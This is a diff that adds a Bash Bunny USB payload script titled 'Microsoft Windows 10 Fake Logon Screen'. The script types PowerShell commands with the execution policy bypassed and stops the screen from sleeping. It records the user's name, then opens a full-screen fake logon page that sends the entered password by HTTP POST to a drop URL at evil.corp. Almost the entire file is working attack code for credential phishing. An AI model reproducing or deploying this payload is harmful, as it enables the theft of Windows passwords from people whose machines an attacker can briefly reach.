@@ -1,0 +1,121 @@
+#!/bin/bash
+#
+# Title:            "Microsoft Windows 10" Fake Logon Screen
+#
+# Description:      
+#                   1) Change "monitor-timeout (AC and DC)" at NEVER with "powercfg" utility.
+#                   2) Change "standby-timeout (AC and DC)" at NEVER with "powercfg" utility.
+#                   3) Retrieve the current username.
+#                   4) Full-screen opening of the phishing HTML page using the default web browser with a random wallpaper.
+#                   5) The "Bash Bunny" can be removed because the files are cached in the web browser.
+#                   6) The password will be sent by HTTP POST to the URL specified in the "DROP_URL" constant.
+#
+# Author:           TW-D
+# Version:          1.0
+# Category:         Phishing
+# Target:           Microsoft Windows 10
+# Attackmodes:      HID and STORAGE
+#
+# TESTED ON
+# ===============
+# Microsoft Windows 10 Family Version 20H2 (PowerShell 5.1)
+# Microsoft Windows 10 Professional Version 20H2 (PowerShell 5.1)
+#
+# NOTE
+# ===============
+# Target computer with a single screen.
+#
+# STATUS
+# ===============
+# Magenta solid ................................... SETUP
+# Yellow single blink ............................. ATTACK
+# Yellow double blink ............................. STAGE2
+# Yellow triple blink ............................. STAGE3
+# Yellow quadruple blink .......................... STAGE4
+# White fast blink ................................ CLEANUP
+# Green 1000ms VERYFAST blink followed by SOLID ... FINISH
+#
+
+######## INITIALIZATION ########
+
+readonly BB_LABEL="BashBunny"
+readonly DROP_URL="http://evil.corp:8080/drop.php?ZXZpbC5jb3Jw.png"
+readonly INPUT_PLACEHOLDER="Password"
+
+######## SETUP ########
+
+LED SETUP
+
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+######## ATTACK ########
+
+LED ATTACK
+
+Q DELAY 8000
+RUN WIN "powershell -NoLogo -NoProfile -ExecutionPolicy Bypass"
+Q DELAY 8000
+
+LED STAGE2
+
+Q STRING "\$BB_VOLUME = \"\$((Get-WmiObject -Class Win32_Volume -Filter \"Label LIKE '${BB_LABEL}'\").Name)payloads\\${SWITCH_POSITION}\\\""
+Q ENTER
+Q DELAY 3500
+Q STRING "CD \"\${BB_VOLUME}\""
+Q ENTER
+Q DELAY 1500
+
+LED STAGE3
+
+# Change "monitor-timeout (AC and DC)" at NEVER with "powercfg" utility.
+#
+Q STRING "(powercfg /Change monitor-timeout-ac 0); (powercfg /Change monitor-timeout-dc 0)"
+Q ENTER
+Q DELAY 1500
+
+# Change "standby-timeout (AC and DC)" at NEVER with "powercfg" utility.
+#
+Q STRING "(powercfg /Change standby-timeout-ac 0); (powercfg /Change standby-timeout-dc 0)"
+Q ENTER
+Q DELAY 1500
+
+# Retrieve the current username.
+#
+Q STRING "\"const CURRENT_USERNAME = '\$([Environment]::UserName)';\" | Out-File -FilePath ./TMP.js"
+Q ENTER
+Q DELAY 1500
+
+Q STRING "\"const DROP_URL = '${DROP_URL}';\" | Out-File -FilePath ./TMP.js -Append"
+Q ENTER
+Q DELAY 1500
+
+Q STRING "\"const INPUT_PLACEHOLDER = '${INPUT_PLACEHOLDER}';\" | Out-File -FilePath ./TMP.js -Append"
+Q ENTER
+Q DELAY 1500
+
+LED STAGE4
+
+# Full-screen opening of the phishing HTML page using the default web browser with a random wallpaper.
+#
+Q STRING "(Invoke-Expression .\\phishing_files\\index.html); exit"
+Q ENTER
+Q DELAY 9000
+Q TAB
+Q DELAY 2000
+Q ENTER
+Q DELAY 2000
+
+######## CLEANUP ########
+
+LED CLEANUP
+
+sync
+
+######## FINISH ########
+
+LED FINISH
+
+# The "Bash Bunny" can be removed because the files are cached in the web browser.
+#
+shutdown -h 0
